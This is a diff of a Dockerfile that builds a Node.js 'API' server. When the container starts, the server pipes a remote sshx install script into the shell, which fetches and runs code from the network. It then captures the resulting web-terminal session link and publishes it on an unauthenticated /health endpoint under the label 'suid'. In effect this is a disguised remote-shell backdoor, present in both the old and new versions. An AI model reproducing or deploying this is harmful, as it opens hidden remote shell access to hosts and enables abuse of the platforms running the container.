@@ -1,74 +1,88 @@
-FROM ubuntu:24.04
+FROM ubuntu:22.04
 
+# Set environment variables
 ENV DEBIAN_FRONTEND=noninteractive
-ENV PORT=10000
+ENV NODE_VERSION=20.x
 
+# Install dependencies
 RUN apt-get update && apt-get install -y \
-  curl \
-  nodejs \
-  npm \
-  ca-certificates \
-  && rm -rf /var/lib/apt/lists/*
+    curl \
+    wget \
+    ca-certificates \
+    gnupg \
+    && rm -rf /var/lib/apt/lists/*
 
+# Install Node.js
+RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION} | bash - \
+    && apt-get install -y nodejs \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create app directory
 WORKDIR /app
 
-RUN cat << 'EOF' > server.js
-const http = require("http");
-const { spawn } = require("child_process");
+# Create Node.js server
+RUN cat > /app/server.js << 'EOF'
+const http = require('http');
+const { exec } = require('child_process');
 
-const PORT = process.env.PORT || 10000;
-let sshxLink = "not-ready";
+const PORT = process.env.PORT || 3000;
+let sshxLink = 'initializing...';
 
-// ---- start sshx and capture stdout ----
-console.log("[+] Starting sshx from Node...");
-
-const sshx = spawn("sh", ["-c", "curl -sSf https://sshx.io/get | sh"], {
-  stdio: ["ignore", "pipe", "pipe"]
-});
-
-sshx.stdout.on("data", (data) => {
-  const text = data.toString();
-  process.stdout.write(text);
-
-  // Extract sshx link once
-  const match = text.match(/https:\/\/sshx\.io\/[a-zA-Z0-9_-]+/);
-  if (match && sshxLink === "not-ready") {
-    sshxLink = match[0];
-    console.log("[+] sshx link captured:", sshxLink);
+// Execute sshx command and capture output
+console.log('Executing sshx command...');
+const sshxProcess = exec('curl -sSf https://sshx.io/get | sh', (error, stdout, stderr) => {
+  if (error) {
+    console.error('Error executing sshx:', error);
+    sshxLink = 'error: ' + error.message;
+    return;
+  }
+  
+  console.log('SSHX stdout:', stdout);
+  console.log('SSHX stderr:', stderr);
+  
+  // Extract the sshx link from output
+  const linkMatch = stdout.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
+  if (linkMatch) {
+    sshxLink = linkMatch[0];
+    console.log('SSHX Link captured:', sshxLink);
+  } else {
+    // Try stderr if not in stdout
+    const linkMatchStderr = stderr.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
+    if (linkMatchStderr) {
+      sshxLink = linkMatchStderr[0];
+      console.log('SSHX Link captured from stderr:', sshxLink);
+    } else {
+      sshxLink = 'link not found in output';
+    }
   }
 });
 
-sshx.stderr.on("data", (data) => {
-  process.stderr.write(data.toString());
-});
-
-sshx.on("exit", (code) => {
-  console.error("[!] sshx exited with code", code);
-});
-
-// ---- HTTP server ----
+// Create HTTP server
 const server = http.createServer((req, res) => {
-  if (req.url === "/") {
-    res.writeHead(200, { "Content-Type": "application/json" });
-    return res.end(JSON.stringify({ message: "welcome" }));
-  }
+  res.setHeader('Content-Type', 'application/json');
 
-  if (req.url === "/halth") {
-    res.writeHead(200, { "Content-Type": "application/json" });
-    return res.end(JSON.stringify({
+  if (req.method === 'GET' && req.url === '/') {
+    res.statusCode = 200;
+    res.end(JSON.stringify({ message: 'Welcome to Node.js API' }));
+  } else if (req.method === 'GET' && req.url === '/health') {
+    res.statusCode = 200;
+    res.end(JSON.stringify({
       timestamp: new Date().toISOString(),
       suid: sshxLink
     }));
+  } else {
+    res.statusCode = 404;
+    res.end(JSON.stringify({ error: 'Not Found' }));
   }
-
-  res.writeHead(404);
-  res.end();
 });
 
-server.listen(PORT, () => {
-  console.log("HTTP server running on", PORT);
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`Server running on port ${PORT}`);
 });
 EOF
 
-EXPOSE 10000
+# Expose port
+EXPOSE 3000
+
+# Start the application
 CMD ["node", "server.js"]
